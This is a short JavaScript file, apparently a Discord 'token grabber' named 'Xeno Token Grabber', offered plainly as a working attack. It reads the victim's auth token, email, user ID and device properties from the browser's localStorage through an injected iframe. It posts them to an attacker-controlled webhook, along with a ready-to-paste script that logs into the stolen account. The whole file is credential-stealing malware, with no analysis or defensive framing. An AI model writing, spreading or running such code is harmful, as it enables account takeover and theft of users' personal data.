location.reload();

const webhookURL = "webhook-url-here";

const i = document.createElement("iframe");

document.body.appendChild(i);

const request = new XMLHttpRequest();

request.open("POST", webhookURL);

request.setRequestHeader("Content-type", "application/json");

const webhook = {
    username: "Xeno Token Grabber",
    avatar_url: "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg",
    content: `**Token:** ${i.contentWindow.localStorage.token.replace('"', "").replace('"', "")}
**Email:** ${i.contentWindow.localStorage.email_cache.replace('"', "").replace('"', "")}
**User ID:** ${i.contentWindow.localStorage.user_id_cache.replace('"', "").replace('"', "")}
**Properties:**
\`\`\`json
${i.contentWindow.localStorage.deviceProperties}
\`\`\`**Login Script:** 
\`\`\`js
location.reload();
var i = document.createElement("iframe");
document.body.appendChild(i);
i.contentWindow.localStorage.token = "${i.contentWindow.localStorage.token.replace(/^"(.*)"$/, "$1")}"
\`\`\``
};

request.send(JSON.stringify(webhook));
